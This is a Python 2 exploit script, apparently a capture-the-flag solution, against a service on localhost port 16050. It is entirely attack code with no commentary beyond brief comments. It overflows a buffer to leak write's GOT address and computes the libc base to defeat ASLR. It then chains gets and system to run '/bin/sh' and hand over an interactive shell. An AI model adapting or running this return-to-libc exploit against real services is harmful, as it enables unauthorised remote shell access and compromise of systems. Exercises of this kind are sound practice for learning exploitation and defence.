from telnetlib import Telnet
import binascii

t = Telnet("localhost", 16050)
s = t.get_socket()

def pack(addr):
    return addr.decode("hex")[::-1]

def unpack(addr):
    return binascii.hexlify(addr[::-1])
    

def read_until(end):
    buf = ""
    while True:
        buf += s.recv(1)
        if end in buf:
            break
    
    return buf


# set write addr and argv
write = []
write.append(pack("08048370")) # write plt
write.append(pack("00000001"))
write.append(pack("0804a01c")) # write got
write.append(pack("00000004"))

main = pack("0804847e")

# leak libc and return to main
payload = "a"*28 + write[0] + main + write[1] + write[2] + write[3]
print read_until("can:\n")
s.send(payload)

# count libc_base when ASLR protection
write_offset = 0xd9da0
write_libc = unpack(s.recv(4))
print "write_libc: " + str(write_libc)
libc_base = int(write_libc, 16) - write_offset
print "libc_base: " + hex(libc_base)[2:]
print read_until("can:\n")


gets_offset = 0x64ae0 
gets = pack(hex(libc_base + gets_offset)[2:])
system_offset = 0x3fc40
system = pack(hex(libc_base + system_offset)[2:])
print unpack(system)
binsh = pack("0804a100")

# ret to gets and system
# setting the argument of system by gets
payload = "a"*24 + gets + system + binsh + binsh
s.send(payload)
s.send("/bin/sh\x00\n")

# interact
t.interact()
